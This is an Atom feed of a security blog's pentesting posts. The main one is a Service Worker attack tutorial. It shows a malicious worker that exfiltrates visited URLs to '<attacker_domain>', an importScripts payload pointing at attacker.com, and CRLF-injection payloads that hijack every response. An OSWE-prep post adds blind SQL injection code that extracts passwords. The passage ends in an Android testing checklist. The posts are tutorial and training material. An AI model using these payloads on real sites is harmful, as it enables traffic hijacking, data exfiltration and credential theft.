<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://alshedivat.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://alshedivat.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2024-12-17T00:40:06+03:00</updated><id>https://alshedivat.github.io/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">Service Worker Tutorial</title><link href="https://alshedivat.github.io/posts/2024/service_wokrer/" rel="alternate" type="text/html" title="Service Worker Tutorial"/><published>2024-11-13T17:14:00+03:00</published><updated>2024-11-13T17:14:00+03:00</updated><id>https://alshedivat.github.io/posts/2024/service_wokrer</id><content type="html" xml:base="https://alshedivat.github.io/posts/2024/service_wokrer/"><![CDATA[<figure> <picture> <img src="/assets/img/posts/sw/sw_logo.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="sw_tutorial" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><br/></p> <h3 data-toc-text="Introduction" id="introduction">Introduction</h3> <p>Service Worker (SW) is a script launched by the browser in the background process. It acts as a proxy between the server and the browser and extend the background processing capabilities for each page. The main advantages are offline interaction and push notifications.</p> <p>SW runs in the worker context, so it does not have access to the DOM-tree and runs in a thread separate from the main JavaScript thread that controls the web application, and therefore does not block it. It is designed to be completely asynchronous, so synchronous APIs (XHR and LocalStorage) cannot be used in SW.</p> <p>One aspect of SW technology is the Cache Interface, which is a caching mechanism completely separate from the HTTP cache. The Cache interface can be accessed both in the SW area and within the main thread. The Cache-Control HTTP header directives will not affect SW caching in any way.</p> <figure> <picture> <img src="/assets/img/posts/sw/sw_scheme.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="sw_tutorial" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><code class="language-plaintext highlighter-rouge">Push notification</code> permissions affect the ability of the SW to interact with the server without user interaction. If <code class="language-plaintext highlighter-rouge">push notifications</code> are prohibited, this limits the SW’s potential to pose a persistent threat. Otherwise, granting permissions increases security risks.</p> <p>You can try out the ability to send notifications yourself using a simple <a href="https://github.com/pirminrehm/service-worker-web-push-example">GitHub project</a>.</p> <figure> <picture> <img src="/assets/img/posts/sw/sw3.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="sw_tutorial" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Check registered SWs via URL:<br/> <code class="language-plaintext highlighter-rouge">chrome://serviceworker-internals/</code> (Chrome)<br/> <code class="language-plaintext highlighter-rouge">about:debugging#/runtime/this-firefox</code>(Firefox)</p> <p><br/></p> <h3 id="using-sw-in-attack">Using SW in attack</h3> <h4 id="traffic-interception">Traffic interception</h4> <p>SW has access to the website’s network traffic. It can intercept network traffic of files within its scope and modify any HTTP header and content.</p> <p>This type of interception can be used to inject malicious content and is not subject to monitoring or security enforcement of existing defenses. For example, when a malicious third-party script is prohibited from modifying other DOM elements, it can use SW to directly modify the DOM content of a web page. In this way, an attacker can potentially use a compromised SW to bypass certain types of document context protection and execute a payload.</p> <p><br/></p> <h4 id="pinning-in-web-applications">Pinning in web applications</h4> <p>Once successfully registered, the SW’s contents (e.g. event listeners) will persist until a new SW replaces the old one. The payload stored in the SW can persist across multiple sessions.</p> <p>An attacker can use this capability in combination with network traffic manipulation to take full control of the target web application on the client side for an extended period of time.</p> <p><br/></p> <h4 id="push-notifications">Push Notifications</h4> <p>One of the previously mentioned features of SW is that it allows a push event to be triggered remotely and a push message to be displayed at any time, regardless of whether the browser is open. This feature gives two advantages to an attacker in implementing fishing attacks:</p> <ol> <li>The attacker does not need to wait for the victim to visit the web application to start phishing - they can start the attack at any time using a push message.</li> <li>The sender of the push message appears to come from a site that is usually legitimate. Therefore, the fishing message will look more realistic compared to a message coming from a different and unknown site.</li> </ol> <p><br/></p> <h3 id="example-of-creating-sw">Example of creating SW</h3> <p>To create a malicious SW in the victim’s browser, two conditions are required:</p> <ul> <li>JavaScript file containing source code of SW placing on same origin</li> <li>Use XSS to register it</li> </ul> <p>Let’s consider the simplest SW <code class="language-plaintext highlighter-rouge">sw.js</code> - we log the victim’s fetch requests in the current Origin by duplicating their URL to the request to the controlled domain:</p> <p>SW source code:</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">self</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">fetch</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">e</span><span class="p">.</span><span class="nf">respondWith</span><span class="p">(</span><span class="nx">caches</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">request</span><span class="p">).</span><span class="nf">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://&lt;attacker_domain&gt;/fetch_url/</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">url</span><span class="p">)</span>
<span class="p">});</span>
</code></pre></div></div> <p>Register SW:</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">load</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">var</span> <span class="nx">sw</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">sw.js</span><span class="dl">"</span><span class="p">;</span>

<span class="nb">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="nx">sw</span><span class="p">,</span> <span class="p">{</span><span class="na">scope</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">})</span>
  <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">registration</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">xhttp2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">xhttp2</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://&lt;attacker_domain&gt;/SW/success</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">xhttp2</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
  <span class="p">},</span> <span class="nf">function </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">xhttp2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">xhttp2</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://&lt;attacker_domain&gt;/SW/error</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">xhttp2</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
  <span class="p">});</span>
  
<span class="p">});</span>
</code></pre></div></div> <p>The serviceWorker.register method is passed the URL of the script containing the SW source code, an important condition is that the <strong>scriptURL</strong> parameter must be Same-Origin, for this reason the SW cannot be installed from a vulnerable subdomain or host of the attacker. In the second parameter <strong>options</strong> we specified <strong>scope</strong> the entire root directory, this is what our SW will control.</p> <p>Result using Burp Collaborator:</p> <figure> <picture> <img src="/assets/img/posts/sw/sw4.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="sw_tutorial" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><br/></p> <h3 id="abusing-importscripts">Abusing importScripts</h3> <p>When registering a SW, additional parameters may be used, which may later end up in sensitive JS functions (gadgets). When discovering a web application, at least pay attention to how the SW request is made.</p> <p>URL example with an additional parameter:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://example.com/sw.js?userid=bob
</code></pre></div></div> <p>The <em>importScripts</em> function called from SW can import a script from another domain. If this function is called using a parameter that an attacker can change, he will be able to import a cross origin JS script and get XSS. This even bypasses CSP protection.</p> <p>Example of vulnerable source code:<br/> <code class="language-plaintext highlighter-rouge">sw.html</code></p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">load</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
	<span class="nb">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="dl">''</span><span class="o">/</span><span class="nx">sw</span><span class="p">.</span><span class="nx">js</span><span class="dl">''</span><span class="o">+</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">)</span>  
<span class="p">});</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">sw.js</code></p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">searchParams</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">host</span> <span class="o">=</span> <span class="nx">searchParams</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">host</span><span class="dl">'</span><span class="p">);</span>
<span class="nb">self</span><span class="p">.</span><span class="nf">importScripts</span><span class="p">(</span><span class="nx">host</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/sw_extra.js</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div> <p>Achivieng XSS using next payload:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://vulnerable.com/sw.html?host=attacker.com
</code></pre></div></div> <p>As written in <a href="https://dl.acm.org/doi/fullHtml/10.1145/3427228.3427290">one</a> paper, this piece of code was used by a web application dedicated to sports, with a traffic of about 50 million people.</p> <p><br/></p> <h3 id="register-sw-using-crlf-injection">Register SW using CRLF-injection</h3> <p>CRLF-Injceiton which allows you to rewrite the HTTP response and do XSS, then its impact can be increased using SW.</p> <p>Trigger XSS:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://example.tld/some/path/foo/bar/?param=x%0D%0AContent-Type:text/
html%0D%0AContent-Length:20%0D%0A%0D%0A&lt;script&gt;XSS&lt;/script&gt;
</code></pre></div></div> <p>Upload JS-file:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://example.tld/some/path/foo/bar/?param=x%0D%0AContent-Type:text/
javascript%0D%0AContent-Length:7%0D%0A%0D%0AJS_file
</code></pre></div></div> <p>There are two necessary points to register SW. But in that case, one problem is actually exists - scope /some/path/foo/bar/, which is not interesting and its better to find a way to make scope a root /.</p> <p>If read the documentation of SW, there is information about the <code class="language-plaintext highlighter-rouge">Service-Worker-Allowed</code> header, which is set in the HTTP response along with the worker’s JS code, and through which it can be redefine the scope.</p> <p>Which in case of CRLF Injection allows to register a SW located in any folder on the root of the site.</p> <p>Final source code which register SW with <code class="language-plaintext highlighter-rouge">Service-Worker-Allowed: /</code> header. SW will change all responses of HTTP-traffic to “Fake response”:</p> <p>Request:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://example.tld/some/path/foo/bar/?param=x%0D%0AService-Worker-Allowed:/
%0D%0AContent-Type:text/javascript%0D%0AContent-Length:162%0D%0A%0D%0Aself.addEventListener
(%22fetch%22,function(event){event.respondWith(new%20Response(%22Fake%20response%22,
{status:200,statusText:%22OK%22,headers:{"Content-Type%22:%22text/html%22}}))})
</code></pre></div></div> <p>Response</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Service</span><span class="o">-</span><span class="nx">Worker</span><span class="o">-</span><span class="nx">Allowed</span><span class="p">:</span><span class="o">/</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span><span class="nx">text</span><span class="o">/</span><span class="nx">javascript</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="p">:</span><span class="mi">162</span>


<span class="nb">self</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">fetch</span><span class="dl">"</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">){</span><span class="nx">event</span><span class="p">.</span><span class="nf">respondWith</span><span class="p">(</span><span class="k">new</span> <span class="nc">Response</span><span class="p">(</span><span class="dl">"</span><span class="s2">Fake
 response</span><span class="dl">"</span><span class="p">,{</span><span class="na">status</span><span class="p">:</span><span class="mi">200</span><span class="p">,</span><span class="na">statusText</span><span class="p">:</span><span class="dl">"</span><span class="s2">OK</span><span class="dl">"</span><span class="p">,</span><span class="na">headers</span><span class="p">:{</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="p">}}))})</span>
</code></pre></div></div> <p>Connect SW using XSS and request:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://example.tld/some/path/foo/bar/?param=x%0D%0AContent-Type:text/
html%0D%0AContent-Length:378%0D%0A%0D%0A%3Cscript%3Enavigator.serviceWorker.register('/some/
path/foo/bar/?param=x%250D%250AService-Worker-Allowed:/%250D%250AContent-Type:text/
javascript%250D%250AContent-Length:162%250D%250A%250D%250Aself.addEventListener
(%2522fetch%2522,function(event){event.respondWith(new%2520Response
(%2522Fake%2520response%2522,{status:200,statusText:%2522OK%2522,headers:{
   %2522Content-Type%2522:%2522text/html%2522}}))})',{scope:'/'})%3C/script%3E
</code></pre></div></div> <p>Response:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Content-Type:text/html
Content-Length:378

<span class="nt">&lt;script&gt;</span><span class="nb">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nf">register</span><span class="p">(</span><span class="dl">'</span><span class="s1">/some/path/foo/bar/?
param=x%0D%0AService-Worker-Allowed:/%0D%0AContent-Type:text/
javascript%0D%0AContent-Length:162%0D%0A%0D%0Aself.addEventListener(%22fetch%22,function
(event){event.respondWith(new%20Response(%22Fake%20response%22,{status:200,
statusText:%22OK%22,headers:{"Content-Type%22:%22text/html%22}}))})</span><span class="dl">'</span><span class="p">,{</span><span class="na">scope</span><span class="p">:</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">})</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div> <p>Thank you, BlackFan, for post in Telegram</p> <p><br/></p> <h3 id="c2-using-sw">C2 using SW</h3> <p>If you are a bit into RedTeam and are familiar with the concept of Command and Control, then the <a href="https://shadow-workers.github.io">Shadow Workers</a> tool was created for you, as well as articles using this tool:</p> <ol> <li><a href="https://trustedsec.com/blog/persistence-through-service-workers-part-1-introduction-and-target-application-setup">Introduction and Target Application Setup</a></li> <li><a href="https://trustedsec.com/blog/persistence-through-service-workers-part-2-c2-setup-and-use">C2 Setup and Use</a></li> <li><a href="https://trustedsec.com/blog/persistence-through-service-workers-part-3-easy-javascript-payload-deployment">Easy JavaScript Payload Deployment</a></li> </ol> <hr/>]]></content><author><name></name></author><category term="tutorial"/><category term="web"/><category term="appsec"/><category term="tutorial"/><category term="c2"/><summary type="html"><![CDATA[Service Worker explaination/tutorial for pentesters]]></summary></entry><entry><title type="html">OSWE preparation</title><link href="https://alshedivat.github.io/posts/2023/oswe_preparation/" rel="alternate" type="text/html" title="OSWE preparation"/><published>2023-12-23T17:14:00+03:00</published><updated>2023-12-23T17:14:00+03:00</updated><id>https://alshedivat.github.io/posts/2023/oswe_preparation</id><content type="html" xml:base="https://alshedivat.github.io/posts/2023/oswe_preparation/"><![CDATA[<figure> <picture> <img src="/assets/img/posts/oswe_preparation/oswe_introduction.jpg" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="oswe_preparation" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="introduction">Introduction</h3> <p data-toc-text="Introduction">Start of preparation for <a href="https://www.offsec.com/courses/web-300/">OSWE</a> exam from OffSec :)<br/> Wanna blog my progress to preparations - share links, progress, minds about and e.t.c</p> <hr/> <h3 data-toc-text="Material" id="сollecting-material-to-study">Сollecting material to study</h3> <p>For first, wanted to get information about exam format, people opinion who passed, found couple of pages:</p> <ul> <li><a href="https://habr.com/ru/companies/pm/articles/733170/">Как я OSWE сдавал</a></li> <li><a href="https://habr.com/ru/companies/angarasecurity/articles/595071/">Becoming a web security expert</a></li> <li><a href="https://charchitverma100.medium.com/an-honest-oswe-2023-review-my-journey-preparation-and-exam-67d0adcbcde4">An honest OSWE 2023 review</a></li> </ul> <p>After, i started to search technical material to prepare exam.<br/> There is <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=665299979">google table</a> with HackTheBox machines which can improve my skill for OSWE exam. IDK what these machines contain, i plan to solve and describe it later, when it be a christmas holidays. And take notes about all whitebox pentesting moments in these machines.</p> <figure> <picture> <img src="/assets/img/posts/oswe_preparation/htb_machines_table.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="oswe_preparation" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>There are machines i’ve decided to solve and write some descriptions:</p> <ul> <li>Blocky (Easy)</li> <li>Help (Easy)</li> <li>Popcorn (Medium)</li> <li>Falafel (Hard)</li> </ul> <p>Also, was found a nice <a href="https://github.com/snoopysecurity/OSWE-Prep">link</a> that can be used too.</p> <hr/> <h3 id="htb-machines">HTB Machines</h3> <p>Next are reviews of hackthebox labs which have some OSWE-like challanges. I’m not going to describe every machine with full write up, I only notice key moments.</p> <h4 id="blocky">Blocky</h4> <p>Simply, dowload JD-GUI and explore couple of jar-files, located in <a href="http://blocky.htb/plugins/">http://blocky.htb/plugins/</a>.</p> <p>JD-GUI is a standalone graphical utility that displays Java source codes of “.class” files. You can browse the reconstructed source code with the JD-GUI for instant access to methods and fields.</p> <figure> <picture> <img src="/assets/img/posts/oswe_preparation/blocky_jd_gui.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="oswe_preparation" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h4 id="help">Help</h4> <p>SQL injection in 1.0.2 of HelpDeskZ - free PHP based software which allows to manage site’s support with a web-based support ticket system.</p> <p>Exploit-db have a Python-version <a href="https://www.exploit-db.com/exploits/41200">exploit</a> for that CVE, but i’ve decided to create my own, Golang version, only for practice.</p> <p>Here is <a href="https://github.com/MikeDakotaStayTrue/Script4You/blob/main/helpdeskz_sqli_exploit.go">link</a> to my GitHub. Some coding was interesting and useful, that was my first full script on Golang.</p> <figure> <picture> <img src="/assets/img/posts/oswe_preparation/help_sqli.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="oswe_preparation" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h4 id="popcorn">Popcorn</h4> <p>Simple task to create PHP-shell for uploading, but bypassing some restrictions via injecting image magic bytes in shell. My choice was PNG.</p> <figure> <picture> <img src="/assets/img/posts/oswe_preparation/popcorn_png.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="oswe_preparation" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Most cofortable for that task was Python, by my opinion, here is <a href="https://github.com/MikeDakotaStayTrue/Script4You/blob/main/upload_php_png.py">link</a> to script.</p> <h4 id="falafel">Falafel</h4> <p>Here was Blind SQLi in the login form, where we could extract some passwords. I have wasted some time on script creation. The task was simple, but it was an annoying error that I couldn’t understand while working with prepared requests in Python.</p> <p>Next situation: for SQLi, I needed to send my body in POST request without URL-encoding, since that is the default behavior. But I found a way to bypass it by using prepared requests.</p> <p>I have not found much practical information about using it, and finding errors myself is waiting for me.</p> <p>Prepared statemets allow to change body after creating a request, but HTTP-header Content-length will not be updated. I didn’t know it.</p> <p>Final piece of code to send URL-decoded body:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">...</span>
  <span class="n">sql_string</span> <span class="o">=</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">'</span><span class="s">+and+ASCII(SUBSTRING(password,{},1))={}--+-</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">indx</span><span class="p">,</span> <span class="n">chr_</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">:</span> <span class="n">sql_string</span><span class="p">,</span> <span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">pass</span><span class="sh">'</span><span class="p">}</span>

  <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Request</span><span class="p">(</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">,</span> <span class="n">lab_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
  
  <span class="n">prep</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">prepare_request</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
  <span class="n">prep</span><span class="p">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="nf">unquote</span><span class="p">(</span><span class="n">prep</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>
  <span class="n">prep</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">Content-length</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">prep</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>

  <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">prep</span><span class="p">)</span>
<span class="bp">...</span>
</code></pre></div></div> <p>It’s better to binary search instead of O(N), but im lazy. Here is proof of dupmping all tables:</p> <figure> <picture> <img src="/assets/img/posts/oswe_preparation/falafel_sqli_tables.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="oswe_preparation" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>UPD, added function for binary search О(logN) - maybe will use it as basement for future tasks:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">binary_extract_passwords</span><span class="p">():</span>
    <span class="n">password</span> <span class="o">=</span> <span class="sh">""</span>

    <span class="k">for</span> <span class="n">indx</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">40</span><span class="p">):</span>
        <span class="n">left</span> <span class="o">=</span> <span class="mi">47</span>
        <span class="n">right</span> <span class="o">=</span> <span class="mi">123</span>

        <span class="k">while</span> <span class="n">left</span> <span class="o">&lt;=</span> <span class="n">right</span><span class="p">:</span>
            <span class="n">cursor</span> <span class="o">=</span> <span class="n">left</span> <span class="o">+</span> <span class="p">(</span><span class="n">right</span> <span class="o">-</span> <span class="n">left</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>

            <span class="c1"># Check cursor (middle)
</span>            <span class="n">sql_string</span> <span class="o">=</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">'</span><span class="s">+and+ASCII(SUBSTRING(password,{},1))={}--+-</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">indx</span><span class="p">,</span> <span class="n">cursor</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="nf">send_request</span><span class="p">(</span><span class="n">sql_string</span><span class="p">)</span>

            <span class="k">if</span> <span class="sh">"</span><span class="s">Wrong identification</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
                <span class="n">password</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="nf">chr</span><span class="p">(</span><span class="n">cursor</span><span class="p">)</span>
                <span class="k">break</span>

            <span class="c1"># Сheck sides
</span>            <span class="n">sql_string</span> <span class="o">=</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">'</span><span class="s">+and+ASCII(SUBSTRING(password,{},1))&gt;{}--+-</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">indx</span><span class="p">,</span> <span class="n">cursor</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="nf">send_request</span><span class="p">(</span><span class="n">sql_string</span><span class="p">)</span>

            <span class="k">if</span> <span class="sh">"</span><span class="s">Wrong identification</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
                <span class="n">left</span> <span class="o">=</span> <span class="n">cursor</span> <span class="o">+</span> <span class="mi">1</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">right</span> <span class="o">=</span> <span class="n">cursor</span> <span class="o">-</span> <span class="mi">1</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
</code></pre></div></div> <p>And <a href="https://github.com/MikeDakotaStayTrue/Script4You/blob/main/blind_sqli_extractor.py">link</a> to my script.</p> <figure> <picture> <img src="/assets/img/posts/oswe_preparation/falafel_sqli_pass.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="oswe_preparation" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><br/><br/></p> <h3 id="buying-web-300">Buying WEB-300</h3> <p>In middle of January 2024, my company bought me the course for my own account.</p> <figure> <picture> <img src="/assets/img/posts/oswe_preparation/web300.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="oswe_preparation" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="passing-exam">Passing exam</h3> <p>(Names when buying and passing exam are different, because i forgot i have another name in international passport lol)</p> <figure> <picture> <img src="/assets/img/posts/oswe_preparation/pass_exam.jpg" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="pass_exam" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <hr/>]]></content><author><name></name></author><category term="cheetsheet"/><category term="preparation"/><category term="offsec"/><category term="oswe"/><category term="web"/><summary type="html"><![CDATA[My OSWE examination preparation]]></summary></entry><entry><title type="html">Android cheet sheet</title><link href="https://alshedivat.github.io/posts/2023/android_cheet_sheet/" rel="alternate" type="text/html" title="Android cheet sheet"/><published>2023-10-24T17:14:00+03:00</published><updated>2023-10-24T17:14:00+03:00</updated><id>https://alshedivat.github.io/posts/2023/android_cheet_sheet</id><content type="html" xml:base="https://alshedivat.github.io/posts/2023/android_cheet_sheet/"><![CDATA[<figure> <picture> <img src="/assets/img/posts/android_cheet_sheet/android.jpg" class="img-fluid rounded z-depth-1" width="auto" height="auto" title="android_cheetsheet" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 data-toc-text="Introduction" id="introduction">Introduction</h3> <p>This post contains a list of checks that must be performed when testing the cybersecurity of Android-based applications.<br/> Each described check, if possible, includes tools that can be used and commands. <br/><br/></p> <h3 data-toc-text="No SSL-Pinning" id="no-ssl-pinning">No SSL-pinning</h3> <p>Lack of SSL-pinning significantly simplify MITM-attacks. Just set third-party certificate to device, and try to proxy traffic.</p> <p>Example of adb commands for installing certificate:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adb root
adb remount
adb push 9a5ba575.0 /system/etc/security/cacerts/
adb shell <span class="nb">chmod </span>664 /system/etc/security/cacerts/9a5ba575.0
</code></pre></div></div> <p>Let’s skip details about this vulnerability, because there are too many articles and information on it on the internet.</p> <hr/> <h3 id="storing-sensitive-data">Storing sensitive data</h3> <p>Android application can local store various sensitive data like access tokens, passwords, cookies and e.t.c.</p> <h4 id="sdcard">sdcard</h4> <p>Check if Android.Manifest.xml contains next line:</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission. WRITE_EXTERNAL_STORAGE"</span><span class="nt">/&gt;</span>

</code></pre></div></div> <p>If it exists, then do recursive search in /sdcard directory.</p> <h4 id="logcat">logcat</h4> <p>For comfortable start to capture log before interact with application.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adb logcat <span class="o">&gt;</span> log.txt
